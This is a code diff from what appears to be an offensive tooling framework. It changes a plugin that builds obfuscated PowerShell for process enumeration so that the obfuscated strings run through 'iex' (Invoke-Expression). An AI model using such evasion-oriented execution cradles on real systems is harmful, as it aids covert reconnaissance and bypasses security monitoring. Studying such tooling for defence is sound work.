@@ -22,15 +22,15 @@ class EnumProcessesPsSgr(BaseCradlePlugin):
 
         if method == "get-ciminstance":
             payload.append(
-                f".({sgr("$proc_list = Get-CimInstance Win32_Process | Select-Object ProcessId, Name, CommandLine")});"
+                f"({sgr("$proc_list = (Get-CimInstance Win32_Process | Select-Object ProcessId, Name, CommandLine)")})|iex;"
             )
         elif method == "get-wmiobject":
             payload.append(
-                f".({sgr("$proc_list = Get-WmiObject Win32_Process | Select-Object ProcessId, Name, CommandLine")});"
+                f"({sgr("$proc_list = (Get-WmiObject Win32_Process | Select-Object ProcessId, Name, CommandLine)")})|iex;"
             )
         else:
             payload.append(
-                f".({sgr("$proc_list = Get-Process | Select-Object Id, Name, CommandLine")});"
+                f"({sgr("$proc_list = (Get-Process | Select-Object Id, Name, CommandLine)")})|iex;"
             )
 
         payload.append(
